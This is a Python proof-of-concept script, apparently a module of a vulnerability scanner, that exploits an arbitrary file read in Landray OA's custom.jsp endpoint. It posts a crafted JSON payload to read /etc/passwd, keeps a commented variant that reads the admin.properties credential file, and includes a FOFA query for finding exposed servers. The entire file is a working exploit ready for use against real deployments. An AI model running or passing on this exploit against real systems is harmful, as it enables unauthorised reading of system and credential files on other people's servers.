#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import requests
from Config.config_requests import headers
from requests.packages.urllib3.exceptions import InsecureRequestWarning


########################################################################################################################
# 脚本信息
NAME='Landray_OA_anyfile_read'
AUTHOR="Faith"
REMARK='蓝凌OA custom.jsp 任意文件读取漏洞'
FOFA_RULE='app="Landray-OA系统"'
########################################################################################################################

def poc(target):
    result={}
    url = target + "/sys/ui/extend/varkind/custom.jsp"
    data = 'var={"body":{"file":"file:///etc/passwd"}}'
    # data = 'var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}'
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        r = requests.post(url=url,headers=headers,data=data,verify=False,timeout=3)
        if r.status_code == 200 and "root:x:0" in r.text:
            result["target"] = target
            result["poc"] = NAME
            result["url"] = url
            return result
        else:
            pass
    except:
        pass

if __name__ == '__main__':
    poc("http://127.0.0.1/")

